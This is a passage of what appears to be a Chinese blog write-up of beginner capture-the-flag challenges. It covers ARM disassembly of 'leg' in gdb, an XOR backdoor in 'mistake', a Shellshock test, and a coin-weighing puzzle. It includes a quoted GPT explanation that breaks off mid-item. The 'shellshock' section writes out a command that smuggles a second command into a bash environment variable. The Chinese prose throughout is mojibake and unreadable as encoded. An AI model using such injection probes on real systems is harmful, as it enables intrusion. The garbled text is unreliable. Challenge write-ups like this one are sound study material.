   <span class="token number">0x00008ce8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">20</span><span class="token operator">></span><span class="token punctuation">:</span>	pop	<span class="token punctuation">&#123;</span>r11<span class="token punctuation">&#125;</span>		<span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token class-name">ldr</span> r11<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">sp</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span> #<span class="token number">4</span><span class="token punctuation">)</span>
   <span class="token number">0x00008cec</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">24</span><span class="token operator">></span><span class="token punctuation">:</span>	bx	lr
End of assembler dump<span class="token punctuation">.</span>
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disass key2
Dump of assembler code <span class="token keyword">for</span> <span class="token class-name">function</span> key2<span class="token punctuation">:</span>
   <span class="token number">0x00008cf0</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span><span class="token punctuation">:</span>	push	<span class="token punctuation">&#123;</span>r11<span class="token punctuation">&#125;</span>		<span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token class-name">str</span> r11<span class="token punctuation">,</span> <span class="token punctuation">[</span>sp<span class="token punctuation">,</span> #<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">!</span><span class="token punctuation">)</span>
   <span class="token number">0x00008cf4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token keyword">add</span>	r11<span class="token punctuation">,</span> sp<span class="token punctuation">,</span> #<span class="token number">0</span>
   <span class="token number">0x00008cf8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">></span><span class="token punctuation">:</span>	push	<span class="token punctuation">&#123;</span>r6<span class="token punctuation">&#125;</span>		<span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token class-name">str</span> r6<span class="token punctuation">,</span> <span class="token punctuation">[</span>sp<span class="token punctuation">,</span> #<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">!</span><span class="token punctuation">)</span>
   <span class="token number">0x00008cfc</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">12</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token keyword">add</span>	r6<span class="token punctuation">,</span> pc<span class="token punctuation">,</span> #<span class="token number">1</span>
   <span class="token number">0x00008d00</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span><span class="token punctuation">:</span>	bx	r6
   <span class="token number">0x00008d04</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">20</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r3<span class="token punctuation">,</span> pc
   <span class="token number">0x00008d06</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">22</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">adds</span>	r3<span class="token punctuation">,</span> #<span class="token number">4</span>
   <span class="token number">0x00008d08</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">24</span><span class="token operator">></span><span class="token punctuation">:</span>	push	<span class="token punctuation">&#123;</span>r3<span class="token punctuation">&#125;</span>
   <span class="token number">0x00008d0a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">26</span><span class="token operator">></span><span class="token punctuation">:</span>	pop	<span class="token punctuation">&#123;</span>pc<span class="token punctuation">&#125;</span>
   <span class="token number">0x00008d0c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">28</span><span class="token operator">></span><span class="token punctuation">:</span>	pop	<span class="token punctuation">&#123;</span>r6<span class="token punctuation">&#125;</span>		<span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token class-name">ldr</span> r6<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">sp</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span> #<span class="token number">4</span><span class="token punctuation">)</span>
   <span class="token number">0x00008d10</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">32</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r0<span class="token punctuation">,</span> r3
   <span class="token number">0x00008d14</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">36</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">sub</span>	sp<span class="token punctuation">,</span> r11<span class="token punctuation">,</span> #<span class="token number">0</span>
   <span class="token number">0x00008d18</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">40</span><span class="token operator">></span><span class="token punctuation">:</span>	pop	<span class="token punctuation">&#123;</span>r11<span class="token punctuation">&#125;</span>		<span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token class-name">ldr</span> r11<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">sp</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span> #<span class="token number">4</span><span class="token punctuation">)</span>
   <span class="token number">0x00008d1c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">44</span><span class="token operator">></span><span class="token punctuation">:</span>	bx	lr
End of assembler dump<span class="token punctuation">.</span>
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disass key3
Dump of assembler code <span class="token keyword">for</span> <span class="token class-name">function</span> key3<span class="token punctuation">:</span>
   <span class="token number">0x00008d20</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span><span class="token punctuation">:</span>	push	<span class="token punctuation">&#123;</span>r11<span class="token punctuation">&#125;</span>		<span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token class-name">str</span> r11<span class="token punctuation">,</span> <span class="token punctuation">[</span>sp<span class="token punctuation">,</span> #<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">!</span><span class="token punctuation">)</span>
   <span class="token number">0x00008d24</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token keyword">add</span>	r11<span class="token punctuation">,</span> sp<span class="token punctuation">,</span> #<span class="token number">0</span>
   <span class="token number">0x00008d28</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r3<span class="token punctuation">,</span> lr
   <span class="token number">0x00008d2c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">12</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r0<span class="token punctuation">,</span> r3
   <span class="token number">0x00008d30</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">sub</span>	sp<span class="token punctuation">,</span> r11<span class="token punctuation">,</span> #<span class="token number">0</span>
   <span class="token number">0x00008d34</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">20</span><span class="token operator">></span><span class="token punctuation">:</span>	pop	<span class="token punctuation">&#123;</span>r11<span class="token punctuation">&#125;</span>		<span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token class-name">ldr</span> r11<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">sp</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span> #<span class="token number">4</span><span class="token punctuation">)</span>
   <span class="token number">0x00008d38</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">24</span><span class="token operator">></span><span class="token punctuation">:</span>	bx	lr
End of assembler dump<span class="token punctuation">.</span>
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>å¯¹ç…§å“ªä¸ªæºç åˆ†æã€‚</p>
<p>ç›´æ¥è®©gptåˆ†æä»€ä¹ˆæ„æ€å§ï¼Œæœ¬äººæ˜¯ä¸ªèœé¸¡æ‰€ä»¥æ±‡ç¼–ä¸å¤ªç†Ÿ</p>
<blockquote>
<p>å½“ç„¶ï¼Œä»¥ä¸‹æ˜¯å¯¹æ¯ä¸ªå‡½æ•°çš„è¯¦ç»†åˆ†æï¼ŒåŒ…æ‹¬æ¯ä¸€æ¡æ±‡ç¼–æŒ‡ä»¤çš„ä½œç”¨ã€‚</p>
<p>### å‡½æ•° <code>main</code></p>
<p>`&#96;&#96;assembly<br> 0x00008d3c &lt;+0&gt;:   push   {r4, r11, lr}<br> 0x00008d40 &lt;+4&gt;:   add   r11, sp, #8<br> 0x00008d44 &lt;+8&gt;:   sub   sp, sp, #12<br> 0x00008d48 &lt;+12&gt;:   mov   r3, #0<br> 0x00008d4c &lt;+16&gt;:   str   r3, [r11, #-16]<br> 0x00008d50 &lt;+20&gt;:   ldr   r0, [pc, #104]   ; 0x8dc0 &lt;main+132&gt;<br> 0x00008d54 &lt;+24&gt;:   bl   0xfb6c <printf><br> 0x00008d58 &lt;+28&gt;:   sub   r3, r11, #16<br> 0x00008d5c &lt;+32&gt;:   ldr   r0, [pc, #96]   ; 0x8dc4 &lt;main+136&gt;<br> 0x00008d60 &lt;+36&gt;:   mov   r1, r3<br> 0x00008d64 &lt;+40&gt;:   bl   0xfbd8 &lt;__isoc99_scanf&gt;<br> 0x00008d68 &lt;+44&gt;:   bl   0x8cd4 <key1><br> 0x00008d6c &lt;+48&gt;:   mov   r4, r0<br> 0x00008d70 &lt;+52&gt;:   bl   0x8cf0 <key2><br> 0x00008d74 &lt;+56&gt;:   mov   r3, r0<br> 0x00008d78 &lt;+60&gt;:   add   r4, r4, r3<br> 0x00008d7c &lt;+64&gt;:   bl   0x8d20 <key3><br> 0x00008d80 &lt;+68&gt;:   mov   r3, r0<br> 0x00008d84 &lt;+72&gt;:   add   r2, r4, r3<br> 0x00008d88 &lt;+76&gt;:   ldr   r3, [r11, #-16]<br> 0x00008d8c &lt;+80&gt;:   cmp   r2, r3<br> 0x00008d90 &lt;+84&gt;:   bne   0x8da8 &lt;main+108&gt;<br> 0x00008d94 &lt;+88&gt;:   ldr   r0, [pc, #44]   ; 0x8dc8 &lt;main+140&gt;<br> 0x00008d98 &lt;+92&gt;:   bl   0x1050c <puts><br> 0x00008d9c &lt;+96&gt;:   ldr   r0, [pc, #40]   ; 0x8dcc &lt;main+144&gt;<br> 0x00008da0 &lt;+100&gt;:   bl   0xf89c <system><br> 0x00008da4 &lt;+104&gt;:   b   0x8db0 &lt;main+116&gt;<br> 0x00008da8 &lt;+108&gt;:   ldr   r0, [pc, #32]   ; 0x8dd0 &lt;main+148&gt;<br> 0x00008dac &lt;+112&gt;:   bl   0x1050c <puts><br> 0x00008db0 &lt;+116&gt;:   mov   r3, #0<br> 0x00008db4 &lt;+120&gt;:   mov   r0, r3<br> 0x00008db8 &lt;+124&gt;:   sub   sp, r11, #8<br> 0x00008dbc &lt;+128&gt;:   pop   {r4, r11, pc}<br> 0x00008dc0 &lt;+132&gt;:   andeq   r10, r6, r12, lsl #9<br> 0x00008dc4 &lt;+136&gt;:   andeq   r10, r6, r12, lsr #9<br> 0x00008dc8 &lt;+140&gt;:       ; <UNDEFINED> instruction: 0x0006a4b0<br> 0x00008dcc &lt;+144&gt;:       ; <UNDEFINED> instruction: 0x0006a4bc<br> 0x00008dd0 &lt;+148&gt;:   andeq   r10, r6, r4, asr #9<br> `&#96;&#96;</UNDEFINED></UNDEFINED></puts></system></puts></key3></key2></key1></printf></p>
<p>\1. <strong><code>push &#123;r4, r11, lr&#125;</code></strong><br>   - å°† <code>r4</code>, <code>r11</code>, å’Œ <code>lr</code> å¯„å­˜å™¨çš„å€¼å‹å…¥æ ˆä¸­ï¼Œç”¨äºä¿å­˜å‡½æ•°è°ƒç”¨å‰çš„çŠ¶æ€ã€‚</p>
<p>\2. <strong><code>add r11, sp, #8</code></strong><br>   - è®¾ç½® <code>r11</code> ä¸ºå½“å‰æ ˆæŒ‡é’ˆåŠ ä¸Š 8ã€‚è¿™é€šå¸¸æ˜¯ä¸ºäº†åˆ›å»ºä¸€ä¸ªæ–°çš„å¸§æŒ‡é’ˆï¼ˆframe pointerï¼‰ã€‚</p>
<p>\3. <strong><code>sub sp, sp, #12</code></strong><br>   - ä¸ºå±€éƒ¨å˜é‡åˆ†é…ç©ºé—´ï¼Œæ ˆæŒ‡é’ˆ <code>sp</code> å‘ä¸‹ç§»åŠ¨ 12 å­—èŠ‚ã€‚</p>
<p>\4. <strong><code>mov r3, #0</code></strong><br>   - å°† 0 èµ‹å€¼ç»™å¯„å­˜å™¨ <code>r3</code>ã€‚</p>
<p>\5. <strong><code>str r3, [r11, #-16]</code></strong><br>   - å°† <code>r3</code> çš„å€¼ï¼ˆ0ï¼‰å­˜å‚¨åˆ° <code>r11</code> æŒ‡å‘çš„ä½ç½®çš„åç§»é‡ -16 å¤„ã€‚</p>
<p>\6. <strong><code>ldr r0, [pc, #104]</code></strong><br>   - ä»ç¨‹åºè®¡æ•°å™¨ <code>pc</code> åŠ  104 å­—èŠ‚çš„åœ°å€å¤„åŠ è½½å€¼åˆ° <code>r0</code>ã€‚è¿™é€šå¸¸æ˜¯ç”¨äºè®¿é—®ä»£ç ä¸­çš„å¸¸é‡æˆ–æ•°æ®ã€‚</p>
<p>\7. <strong><code>bl 0xfb6c &lt;printf&gt;</code></strong><br>   - è°ƒç”¨ <code>printf</code> å‡½æ•°ï¼Œ<code>bl</code> æŒ‡ä»¤ç”¨äºåˆ†æ”¯å¹¶é“¾æ¥ï¼Œä¿å­˜è¿”å›åœ°å€åˆ°é“¾æ¥å¯„å­˜å™¨ <code>lr</code>ã€‚</p>
<p>\8. <strong><code>sub r3, r11, #16</code></strong><br>   - è®¡ç®— <code>r11</code> å‡å» 16ï¼Œç»“æœå­˜å…¥ <code>r3</code>ã€‚</p>
<p>\9. <strong><code>ldr r0, [pc, #96]</code></strong><br>   - ä»ç¨‹åºè®¡æ•°å™¨ <code>pc</code> åŠ  96 å­—èŠ‚çš„åœ°å€å¤„åŠ è½½å€¼åˆ° <code>r0</code>ã€‚</p>
<p>\10. <strong><code>mov r1, r3</code></strong><br>   - å°† <code>r3</code> çš„å€¼å¤åˆ¶åˆ° <code>r1</code>ã€‚</p>
<p>\11. <strong><code>bl 0xfbd8 &lt;__isoc99_scanf&gt;</code></strong><br>   - è°ƒç”¨ <code>scanf</code> å‡½æ•°ï¼Œ<code>r0</code> å’Œ <code>r1</code> ä½œä¸ºå‚æ•°ä¼ é€’ã€‚</p>
<p>\12. <strong><code>bl 0x8cd4 &lt;key1&gt;</code></strong><br>   - è°ƒç”¨ <code>key1</code> å‡½æ•°ã€‚</p>
<p>\13. <strong><code>mov r4, r0</code></strong><br>   - å°† <code>key1</code> å‡½æ•°è¿”å›å€¼å­˜å‚¨åˆ° <code>r4</code>ã€‚</p>
<p>\14. <strong><code>bl 0x8cf0 &lt;key2&gt;</code></strong><br>   - è°ƒç”¨ <code>key2</code> å‡½æ•°ã€‚</p>
<p>\15. <strong><code>mov r3, r0</code></strong><br>   - å°† <code>key2</code> å‡½æ•°è¿”å›å€¼å­˜å‚¨åˆ° <code>r3</code>ã€‚</p>
<p>\16. <strong><code>add r4, r4, r3</code></strong><br>   - å°† <code>r4</code> å’Œ <code>r3</code> çš„å€¼ç›¸åŠ ï¼Œç»“æœå­˜å› <code>r4</code>ã€‚</p>
<p>\17. <strong><code>bl 0x8d20 &lt;key3&gt;</code></strong><br>   - è°ƒç”¨ <code>key3</code> å‡½æ•°ã€‚</p>
<p>\18. <strong><code>mov r3, r0</code></strong><br>   - å°† <code>key3</code> å‡½æ•°è¿”å›å€¼å­˜å‚¨åˆ° <code>r3</code>ã€‚</p>
<p>\19. <strong><code>add r2, r4, r3</code></strong><br>   - å°† <code>r4</code> å’Œ <code>r3</code> çš„å€¼ç›¸åŠ ï¼Œç»“æœå­˜å› <code>r2</code>ã€‚</p>
<p>\20. <strong><code>ldr r3, [r11, #-16]</code></strong><br>   - ä» <code>r11</code> æŒ‡å‘çš„ä½ç½®çš„åç§»é‡ -16 å¤„åŠ è½½å€¼åˆ° <code>r3</code>ã€‚</p>
<p>\21. <strong><code>cmp r2, r3</code></strong><br>   - æ¯”è¾ƒ <code>r2</code> å’Œ <code>r3</code> çš„å€¼ã€‚</p>
<p>\22. <strong><code>bne 0x8da8 &lt;main+108&gt;</code></strong><br>   - å¦‚æœ <code>r2</code> å’Œ <code>r3</code> ä¸ç›¸ç­‰ï¼Œè·³è½¬åˆ° <code>0x8da8</code> åœ°å€å¤„ã€‚</p>
<p>\23. <strong><code>ldr r0, [pc, #44]</code></strong><br>   - ä»ç¨‹åºè®¡æ•°å™¨ <code>pc</code> åŠ  44 å­—èŠ‚çš„åœ°å€å¤„åŠ è½½å€¼åˆ° <code>r0</code>ã€‚</p>
<p>\24. <strong><code>bl 0x1050c &lt;puts&gt;</code></strong><br>   - è°ƒç”¨ <code>puts</code> å‡½æ•°ã€‚</p>
<p>\25. <strong><code>ldr r0, [pc, #40]</code></strong><br>   - ä»ç¨‹åºè®¡æ•°å™¨ <code>pc</code> åŠ  40 å­—èŠ‚çš„åœ°å€å¤„åŠ è½½å€¼åˆ° <code>r0</code>ã€‚</p>
<p>\26. <strong><code>bl 0xf89c &lt;system&gt;</code></strong><br>   - è°ƒç”¨ <code>system</code> å‡½æ•°ã€‚</p>
<p>\27. <strong><code>b 0x8db0 &lt;main+116&gt;</code></strong><br>   - æ— æ¡ä»¶è·³è½¬åˆ° <code>0x8db0</code> åœ°å€å¤„ã€‚</p>
<p>\28. <strong><code>ldr r0, [pc, #32]</code></strong><br>   - ä»ç¨‹åºè®¡æ•°å™¨ <code>pc</code> åŠ  32 å­—èŠ‚çš„åœ°å€å¤„åŠ è½½å€¼åˆ° <code>r0</code>ã€‚</p>
<p>\29. <strong><code>bl 0x1050c &lt;puts&gt;</code></strong><br>   - å†æ¬¡è°ƒç”¨ <code>puts</code> å‡½æ•°ã€‚</p>
<p>\30. <strong><code>mov r3, #0</code></strong><br>   - å°† 0 èµ‹å€¼ç»™ <code>r3</code>ã€‚</p>
<p>\31. <strong><code>mov r0, r3</code></strong><br>   - å°† <code>r3</code> çš„å€¼å¤åˆ¶åˆ° <code>r0</code>ã€‚</p>
<p>\32. **&#96;sub sp, r11</p>
</blockquote>
<p>ä½†å…¶å®çœ‹ä¸çœ‹å¾—æ‡‚éƒ½ä¸å½±å“åšé¢˜ï¼Œåªè¦çŸ¥é“é‚£ç§å‡½æ•°å†armä¸‹è¿”å›å€¼éƒ½æ˜¯r0å¯„å­˜å™¨å­˜å‚¨çš„ï¼Œ </p>
<p>key1ï¼Œ0x8cdc+8&#x3D;0x8CE4</p>
<p><img src="https://s2.loli.net/2024/08/19/L7EB5uoNz8QCbjm.png" alt="b604b79856a84838876c023b99442bb2.png"></p>
<p>key2,0x00008d04 + 8 + 4 &#x3D; 0x00008d0c</p>
<p><img src="https://s2.loli.net/2024/08/19/LIalFnVpDO1JM5q.png" alt="ed42bb558eba4c99b163c4818e430cc6.png"></p>
<p>key3ï¼Œå…¶ä¸­lræ˜¯è¿”å›åœ°å€ï¼Œæ‰€ä»¥å°±æ˜¯0x8d80</p>
<p><img src="https://s2.loli.net/2024/08/19/oQ8f1OjkHsz6nbT.png" alt="5193ddb4cf474f2980f87282be76edbf.png"></p>
<p><img src="https://s2.loli.net/2024/08/19/exdVI7jpYsE25gS.png" alt="c26f932a5ed14a7381f28e78ff493a74.png"></p>
<p>æœ€åå°†ä»–ä»¬ä¸‰ä¸ªæ•°ç›¸åŠ å¾—åˆ°key&#x3D;108400</p>
<p><img src="https://s2.loli.net/2024/08/19/QopZRxUyE6JKkBe.png" alt="632ae9a665b14996b0c1c5ce0d3a249f.png"></p>
<h5 id="ç¬¬ä¹é¢˜-mistake"><a href="#ç¬¬ä¹é¢˜-mistake" class="headerlink" title="ç¬¬ä¹é¢˜-mistake"></a>ç¬¬ä¹é¢˜-mistake</h5><p>æœ‰åé—¨ï¼Œç›´æ¥çœ‹xorå‡½æ•°å§ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/1vQY5ZACDuq2spr.png" alt="7dba3eee7773404c8f6467cd945de513.png"></p>
<p>å°±æ˜¯ä¸1å¼‚æˆ–ï¼Œç›´æ¥è¾“å…¥åä¸ª1ç„¶åå¼‚æˆ–ç»“æœå°±æ˜¯åä¸ª0ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/zHmoDnswQl5UtbO.png" alt="0f422b1314694682963b394eb1e3497d.png"></p>
<p>getshell</p>
<p><img src="https://s2.loli.net/2024/08/19/4AKUodw7cyXvr9Y.png" alt="99e2cd6c0a394425bd699aa898315563.png"></p>
<p><img src="https://s2.loli.net/2024/08/19/1wXP35ZmvoCuirN.png" alt="77d76a63685c4fadae168b7402519ab2.png"></p>
<h5 id="ç¬¬åé¢˜-shellshock"><a href="#ç¬¬åé¢˜-shellshock" class="headerlink" title="ç¬¬åé¢˜-shellshock"></a>ç¬¬åé¢˜-shellshock</h5><p>çœ‹ä¸€ä¸‹æºç å°±çŸ¥é“è¯¥æ€ä¹ˆå†™äº†ï¼Œå…¶å®ã€‚å¯ä»¥çœ‹åˆ°ç›´æ¥è°ƒç”¨bashäº†ã€‚</p>
<p>ç›´æ¥ä½¿ç”¨</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">env</span> <span class="token assign-left variable">x</span><span class="token operator">=</span><span class="token string">'() &#123; :;&#125;; echo TEST'</span> ./bash <span class="token parameter variable">-c</span> <span class="token builtin class-name">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>è¯æ˜å®ƒå­˜åœ¨ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/jzFe4DrlBR3vPdM.png" alt="ae6e06fa3d844292b58b04b8ca1473da.png"></p>
<h5 id="ç¬¬åä¸€é¢˜-coin1"><a href="#ç¬¬åä¸€é¢˜-coin1" class="headerlink" title="ç¬¬åä¸€é¢˜-coin1"></a>ç¬¬åä¸€é¢˜-coin1</h5><p>è¿™é¢˜ï¼Œå…¨è‹±æ–‡ç”¨gptå¸®æˆ‘ç†è§£ä¸€ä¸‹</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½ éœ€è¦åœ¨æœ‰é™çš„ç§°é‡æ¬¡æ•°å†…æ‰¾åˆ°é‚£æšä¼ªé€ çš„ç¡¬å¸ã€‚è¿™ä¸ªé—®é¢˜è€ƒéªŒçš„æ˜¯ä½ çš„é€»è¾‘æ¨ç†èƒ½åŠ›å’Œä¼˜åŒ–ç§°é‡ç­–ç•¥çš„èƒ½åŠ›ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œä½¿ç”¨**äºŒåˆ†æ³•**ï¼ˆæˆ–åˆ†ç»„ç­–ç•¥ï¼‰æ˜¯è§£å†³è¿™ç§ç§°é‡é—®é¢˜çš„æœ€ä½³æ–¹æ³•ä¹‹ä¸€ã€‚

<span class="token comment">### è§£å†³æ­¥éª¤ï¼š</span>

<span class="token number">1</span>. **åˆå§‹æ¡ä»¶**ï¼šä½ æœ‰ <span class="token variable"><span class="token variable">`</span>N<span class="token variable">`</span></span> æšç¡¬å¸ï¼Œå¹¶ä¸”æœ‰ <span class="token variable"><span class="token variable">`</span>C<span class="token variable">`</span></span> æ¬¡ç§°é‡æœºä¼šã€‚

<span class="token number">2</span>. **åˆ†ç»„ç§°é‡**ï¼š
   - æ¯æ¬¡ç§°é‡æ—¶ï¼Œä½ å°†ç¡¬å¸åˆ†æˆä¸¤ç»„æ¥ç§°é‡ï¼ˆæˆ–è€…æ›´å¤šç»„ï¼Œå¦‚æœ N å¾ˆå¤§ï¼‰ã€‚
   - é€šè¿‡æ¯”è¾ƒæ¯ç»„çš„æ€»é‡é‡ï¼Œä½ å¯ä»¥ç¡®å®šå“ªä¸€ç»„å¯èƒ½åŒ…å«å‡å¸ã€‚

<span class="token number">3</span>. **å‡å°‘æœç´¢èŒƒå›´**ï¼š
   - æ¯æ¬¡ç§°é‡åï¼Œä½ å¯ä»¥ç¼©å°å¯èƒ½åŒ…å«å‡å¸çš„ç¡¬å¸æ•°é‡ã€‚
   - ç»§ç»­å°†åŒ…å«å‡å¸çš„é‚£ä¸€ç»„å†åˆ†ç»„ç§°é‡ï¼Œç›´åˆ°æ‰¾å‡ºå‡å¸ã€‚

<span class="token comment">### ä¾‹å­æ¼”ç¤ºï¼š</span>

å‡è®¾æœ‰ <span class="token variable"><span class="token variable">`</span><span class="token number">8</span><span class="token variable">`</span></span> æšç¡¬å¸ï¼Œä¸”ä½ æœ‰ <span class="token variable"><span class="token variable">`</span><span class="token number">3</span><span class="token variable">`</span></span> æ¬¡ç§°é‡æœºä¼š <span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span><span class="token assign-left variable">N</span><span class="token operator">=</span><span class="token number">8</span>, <span class="token assign-left variable">C</span><span class="token operator">=</span><span class="token number">3</span><span class="token variable">`</span></span><span class="token punctuation">)</span>ã€‚

**ç¬¬ä¸€æ¬¡ç§°é‡**ï¼š
- æŠŠç¡¬å¸åˆ†æˆä¸¤ç»„ï¼Œåˆ†åˆ«æ˜¯ <span class="token variable"><span class="token variable">`</span><span class="token number">0</span>-3<span class="token variable">`</span></span> å’Œ <span class="token variable"><span class="token variable">`</span><span class="token number">4</span>-7<span class="token variable">`</span></span>ã€‚
- é€‰æ‹© <span class="token variable"><span class="token variable">`</span><span class="token number">0</span>, <span class="token number">1</span>, <span class="token number">2</span>, <span class="token number">3</span><span class="token variable">`</span></span> å››æšç¡¬å¸ç§°é‡ï¼Œè®°ä¸‹å®ƒä»¬çš„æ€»é‡é‡ã€‚
  - å¦‚æœæ€»é‡é‡ä¸º <span class="token variable"><span class="token variable">`</span><span class="token number">40</span><span class="token variable">`</span></span>ï¼ˆæ¯æšç¡¬å¸éƒ½æ˜¯çœŸå¸ï¼‰ï¼Œé‚£ä¹ˆå‡å¸åœ¨ <span class="token variable"><span class="token variable">`</span><span class="token number">4</span>-7<span class="token variable">`</span></span> ä¸­ã€‚
  - å¦‚æœæ€»é‡é‡ä¸º <span class="token variable"><span class="token variable">`</span><span class="token number">39</span><span class="token variable">`</span></span>ï¼Œé‚£ä¹ˆå‡å¸åœ¨ <span class="token variable"><span class="token variable">`</span><span class="token number">0</span>-3<span class="token variable">`</span></span> ä¸­ã€‚

**ç¬¬äºŒæ¬¡ç§°é‡**ï¼š
- å‡è®¾ç¬¬ä¸€è½®åæ€€ç–‘å‡å¸åœ¨ <span class="token variable"><span class="token variable">`</span><span class="token number">4</span>-7<span class="token variable">`</span></span> ä¸­ï¼Œå†å°† <span class="token variable"><span class="token variable">`</span><span class="token number">4</span>-7<span class="token variable">`</span></span> åˆ†æˆä¸¤ç»„ï¼Œ<span class="token variable"><span class="token variable">`</span><span class="token number">4</span>, <span class="token number">5</span><span class="token variable">`</span></span> å’Œ <span class="token variable"><span class="token variable">`</span><span class="token number">6</span>, <span class="token number">7</span><span class="token variable">`</span></span>ã€‚
- é€‰æ‹© <span class="token variable"><span class="token variable">`</span><span class="token number">4</span>, <span class="token number">5</span><span class="token variable">`</span></span> ç§°é‡ã€‚
  - å¦‚æœæ€»é‡é‡ä¸º <span class="token variable"><span class="token variable">`</span><span class="token number">20</span><span class="token variable">`</span></span>ï¼Œé‚£ä¹ˆå‡å¸åœ¨ <span class="token variable"><span class="token variable">`</span><span class="token number">6</span>, <span class="token number">7</span><span class="token variable">`</span></span> ä¸­ã€‚
  - å¦‚æœæ€»é‡é‡ä¸º <span class="token variable"><span class="token variable">`</span><span class="token number">19</span><span class="token variable">`</span></span>ï¼Œé‚£ä¹ˆå‡å¸åœ¨ <span class="token variable"><span class="token variable">`</span><span class="token number">4</span>, <span class="token number">5</span><span class="token variable">`</span></span> ä¸­ã€‚

**ç¬¬ä¸‰æ¬¡ç§°é‡**ï¼š
- é€‰æ‹©æœ€åä¸€ç»„ä¸­çš„å•ä¸ªç¡¬å¸è¿›è¡Œç§°é‡å³å¯ç¡®è®¤å‡å¸æ˜¯å“ªä¸€ä¸ªã€‚

<span class="token comment">### é€šç”¨ç­–ç•¥ï¼š</span>

- æ¯æ¬¡ç§°é‡åéƒ½å°†å‰©ä¸‹çš„ç¡¬å¸æ•°é‡å‡åŠï¼Œä»¥æœ€å¤§åŒ–ä¿¡æ¯è·å–ã€‚
